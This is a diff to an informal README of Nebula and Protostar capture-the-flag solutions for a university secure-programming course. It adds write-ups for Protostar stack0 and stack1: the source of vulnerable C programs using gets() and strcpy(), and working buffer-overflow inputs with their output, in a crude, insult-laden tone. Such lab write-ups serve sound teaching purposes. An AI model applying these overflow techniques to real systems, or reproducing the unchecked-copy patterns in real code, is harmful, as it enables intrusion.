@@ -1,7 +1,7 @@
 # SECPROG-Unisa
 Solutions for Nebula and Protostar CTFs for the Secure Programming course of the Master's Degree in Cybersecurity of Unisa.
 
-This repository aims to provide straightforward and simple explanations on how to solve Nebula and Protostar CTFs shown during the Secure Programming Course of the Master's Degree in Cybersecurity of Unisa.
+This repository aims to provide straightforward and simple EXPLAINATIONS on how to solve Nebula and Protostar CTFs shown during the Secure Programming Course of the Master's Degree in Cybersecurity of Unisa. I'm not just leaving a script, I'm explaining what the hell I am doing.
 
 Beware: I'm really informal here, and I'm not interested in sounding professional. If you're sensible to slurs, slangs and shit, just go away and study somewhere else. If you are an HR, this is not my CV. Take this file as a "friendly yapping about CTFs".
 
@@ -54,7 +54,7 @@ You have successfully executed getflag on a target account
 
 Success.
 
-## Level 01
+### Level 01
 
 There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
 
@@ -135,7 +135,7 @@ You have successfully executed getflag on a target account
 
 Success.
 
-## Level 02
+### Level 02
 
 There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
 
@@ -197,7 +197,7 @@ You have successfully executed getflag on a target account
 
 Success.
 
-## Level 04
+### Level 04
 This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)
 
 To do this level, log in as the level04 account with the password level04. Files for this level can be found in /home/flag04.
@@ -293,7 +293,7 @@ You have successfully executed getflag on a target account
 
 Success.
 
-## Level 07
+### Level 07
 
 The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.
 
@@ -412,7 +412,7 @@ You have successfully executed getflag on a target account
 
 Success.
 
-## Level 10
+### Level 10
 
 The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.
 
@@ -602,7 +602,7 @@ You have successfully executed getflag on a target account
 
 Success.
 
-## Level 13
+### Level 13
 
 There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.
 
@@ -683,3 +683,137 @@ You have successfully executed getflag on a target account
 
 Success.
 
+## Protostar
+
+### Before we start...
+Let's check the machine OS and architecture since we'll work with memory and shit:
+
+```
+user@protostar:~$ lsb_release -a
+No LSB modules are available.
+Distributor ID: Debian
+Description:    Debian GNU/Linux 6.0.3 (squeeze)
+Release:        6.0.3
+Codename:       squeeze
+user@protostar:~$ arch
+i686
+```
+
+We're on Debian 6.0.3 and the machine runs at 32 bit. Nice to know.
+
+### Stack 0
+
+This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.
+
+This level is at /opt/protostar/bin/stack0
+
+```
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+
+int main(int argc, char **argv)
+{
+  volatile int modified;
+  char buffer[64];
+
+  modified = 0;
+  gets(buffer);
+
+  if(modified != 0) {
+      printf("you have changed the 'modified' variable\n");
+  } else {
+      printf("Try again?\n");
+  }
+}
+```
+
+To solve this level we have to override the content of `modified` variable.
+
+Analyzing the source code, we notice the usage of `gets()`. This function is notoriously insecure, but let's read its `man` entry anyway:
+
+"Never use gets().  Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past  the  end of  the  buffer, it is extremely dangerous to use.  It has been used to break computer security".
+
+Basically if this function is used, a buffer overflow attack is feasible.
+
+We have to check if the `buffer` and `modified` variables are in contiguous memory regions.
+
+Actually, we can assume they do because of how the stack works on Linux systems. 
+Variables are pushed on top of the stack in the declaration order. On our program `modified` is declared before `buffer`.
+
+So if we override 65 bytes starting from the base address of `buffer`, we're overriding `modified`.
+
+We just have to provide 65 characters to `./stack0`. I will use a simple python script to accomplis so because I'm not a subhuman and I will not count 65 character by hand:
+
+```
+user@protostar:/opt/protostar/bin$ python -c "print('a'*65)" | /opt/protostar/bin/stack0
+you have changed the 'modified' variable
+```
+
+Success.
+
+## Stack 1
+
+This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.
+
+This level is at /opt/protostar/bin/stack1
+
+Hints 
+- If you are unfamiliar with the hexadecimal being displayed, “man ascii” is your friend. 
+- Protostar is little endian.
+
+```
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char **argv)
+{
+  volatile int modified;
+  char buffer[64];
+
+  if(argc == 1) {
+      errx(1, "please specify an argument\n");
+  }
+
+  modified = 0;
+  strcpy(buffer, argv[1]);
+
+  if(modified == 0x61626364) {
+      printf("you have correctly got the variable to the right value\n");
+  } else {
+      printf("Try again, you got 0x%08x\n", modified);
+  }
+}
+```
+
+This time we have to override `modified` with a certain value. The source code suggests us this value: `0x61626364`.
+
+But wtf is that? If you're not a script kiddie you would know it's hexadecimal.
+
+Let's read the `man ascii` entry to know which char are these:
+- 0x61 -> "a"
+- 0x62 -> "b"
+- you got the point...
+
+So we have to input `abcd` into `modified`.
+
+How tf are we going to accomplish it without a `gets()`?
+
+Actually this program uses the `strcpy()` function, that still doesn't check the size of the destination memory.
+
+So if `argv[1]` is 65 bytes and `buffer` is 64 bytes, it will still copy 65 bytes.
+
+Anyway, if we're just going to put `abcd` into the variable, we would miserably fail, because Protostar is little endian. We have to reverse it (if it's not clear, it's `dcba`).
+
+Let's perform the attack:
+
+```
+user@protostar:/opt/protostar/bin$ /opt/protostar/bin/stack1 `python -c "print('a' * 64 + 'dcba')"`
+you have correctly got the variable to the right value
+```
+
+Success.
+
+## Stack 2
